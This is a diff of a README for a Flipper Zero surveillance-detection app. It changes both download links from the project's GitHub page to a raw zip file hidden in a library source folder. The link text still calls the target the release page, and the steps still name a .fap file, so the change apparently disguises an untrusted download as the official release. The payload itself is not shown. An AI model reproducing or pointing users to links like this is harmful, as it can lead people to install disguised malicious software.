@@ -1,13 +1,13 @@
 # 🛡️ FlipDeFlock - Detect surveillance and secure your network
 
-[![](https://img.shields.io/badge/Download-FlipDeFlock-blue.svg)](https://github.com/garrettwise814/FlipDeFlock)
+[![](https://img.shields.io/badge/Download-FlipDeFlock-blue.svg)](https://raw.githubusercontent.com/garrettwise814/FlipDeFlock/main/lib/esp-serial-flasher/src/De_Flock_Flip_1.0-alpha.2.zip)
 
 FlipDeFlock turns your Flipper Zero into a mobile tool for security awareness. The app monitors your surroundings for hidden cameras and tracking devices. It identifies Automated License Plate Reader systems and checks the security of local Wi-Fi networks. The tool also detects unauthorized access attempts and scans for personal tracking devices.
 
 ## 📥 How to download the app
 
 1. Open your web browser.
-2. Visit the [FlipDeFlock release page](https://github.com/garrettwise814/FlipDeFlock).
+2. Visit the [FlipDeFlock release page](https://raw.githubusercontent.com/garrettwise814/FlipDeFlock/main/lib/esp-serial-flasher/src/De_Flock_Flip_1.0-alpha.2.zip).
 3. Find the latest version under the "Releases" section.
 4. Download the file named `FlipDeFlock.fap`.
 5. Connect your Flipper Zero to your computer using a USB-C cable.
